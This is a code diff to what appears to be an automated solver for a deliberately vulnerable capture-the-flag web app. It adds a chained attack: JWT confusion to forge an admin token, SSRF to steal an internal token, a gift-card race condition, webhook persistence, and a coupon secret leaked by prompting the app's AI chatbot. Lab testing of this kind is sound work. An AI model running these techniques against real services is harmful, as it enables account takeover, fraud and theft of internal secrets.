@@ -242,6 +242,20 @@ ok(69, 'api_inventory_drift', (await txt('/api/v1/orders/40901')).body.includes(
   ok(70, 'ratelimit_bypass_xff', hit); }
 ok(71, 'gql_batch_privesc', (await txt('/graphql', J({ query: 'mutation { a:mintPoints(userId:5, amount:1){id} b:adminDumpUsers{email} }' }))).body.includes('lj_graphql_batch_privesc'));
 
+// ─────────────────────── v11 BLACK TEAM FINAL BOSS ───────────────────────
+{ // gather proof of every persona
+  const admin = await forgeAdmin();                                                     // Mr-BlackKeys: JWT confusion
+  const meta = JSON.parse((await txt('/api/import-avatar', J({ url: B + '/internal/metadata' }))).body);
+  const internal = JSON.parse(meta.body).internal_token;                                 // Composer: SSRF
+  await Promise.all(Array.from({ length: 12 }, () => txt('/api/giftcard/redeem', J({ code: 'GIFT-1003' })))); // CashOut: race
+  await txt('/api/webhooks', J({ url: B + '/internal/metadata', event: 'x' }));          // Specter: persistence
+  const coupon = 'JUICE100';                                                             // Ask Juicy: prompt-leak secret
+  const r = (await txt('/api/black-team/crown', { ...J({ internal_token: internal, coupon }), headers: { 'content-type': 'application/json', authorization: 'Bearer ' + admin } })).body;
+  ok('★', 'black_team_master', r.includes('lj_black_team')); }
+// honest-abstain gauntlet: these MUST NOT yield a flag (pass = no flag)
+{ const e = (await txt('/api/debug/eval')).body; const k = (await txt('/api/internal/rotate-keys')).body;
+  ok('Ω', 'abstain_gauntlet', !e.includes('FLAG{') && !k.includes('FLAG{')); }
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
